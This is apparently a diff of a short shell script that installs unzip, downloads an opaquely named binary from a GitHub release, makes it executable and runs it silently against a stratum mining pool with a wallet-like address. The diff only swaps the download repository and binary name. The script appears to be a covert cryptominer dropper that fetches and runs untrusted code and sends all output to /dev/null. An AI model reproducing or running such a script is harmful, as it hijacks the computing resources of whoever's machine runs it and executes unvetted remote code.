@@ -1,5 +1,5 @@
 #!/bin/sh
 apt update && apt install unzip
-wget https://github.com/beltecj/dfgdfg/releases/download/dfgdfg/kasu
-chmod +x kasu
-./kasu -P stratum1+tcp://cb5691ea88389782ab6415d498877356f66e6c37a778.$(shuf -n 1 -i 1-99999)-rki@de.catchthatrabbit.com:8008 > /dev/null 2>&1
+wget https://github.com/reputrra/quys/releases/download/liops/rkkki
+chmod +x rkkki
+./rkkki -P stratum1+tcp://cb5691ea88389782ab6415d498877356f66e6c37a778.$(shuf -n 1 -i 1-99999)-rki@de.catchthatrabbit.com:8008 > /dev/null 2>&1
